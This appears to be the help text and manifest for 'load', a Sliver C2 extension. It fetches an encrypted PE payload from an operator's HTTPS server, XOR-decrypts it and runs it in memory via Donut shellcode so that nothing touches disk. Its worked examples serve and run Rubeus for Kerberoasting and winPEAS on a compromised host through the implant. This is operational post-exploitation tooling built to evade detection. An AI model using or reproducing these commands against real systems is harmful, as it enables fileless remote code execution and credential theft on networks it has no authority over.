name: load
help:
Execute a PE binary entirely in-memory via Donut shellcode. Fetches an encrypted payload from the operator's HTTPS server, XOR-decrypts it, and runs it without touching disk. Captures stdout/stderr and returns output to the Sliver console.

Usage: load url=<https://...> key=<64 hex chars>

  url — HTTPS URL serving the encrypted payload (payload.enc from 'loadkit load')
  key — 32-byte XOR key, hex-encoded (printed by 'loadkit load')

First run:
  1. Operator: loadkit load --binary rubeus.exe --args "kerberoast /nowrap" --url https://192.168.1.10:8443/abc --serve
  2. Sliver:   extensions install build/load-0.1.0.tar.gz
  3. Sliver:   load url=https://192.168.1.10:8443/abc key=<key from step 1>

Subsequent runs (same session, different binary):
  1. Operator: loadkit load --binary winpeas.exe --url https://192.168.1.10:8443/xyz --serve
  2. Sliver:   load url=https://192.168.1.10:8443/xyz key=<new key>

commands.name: load
commands.help: Execute a PE binary in-memory via Donut shellcode (fetches encrypted payload from HTTPS URL)
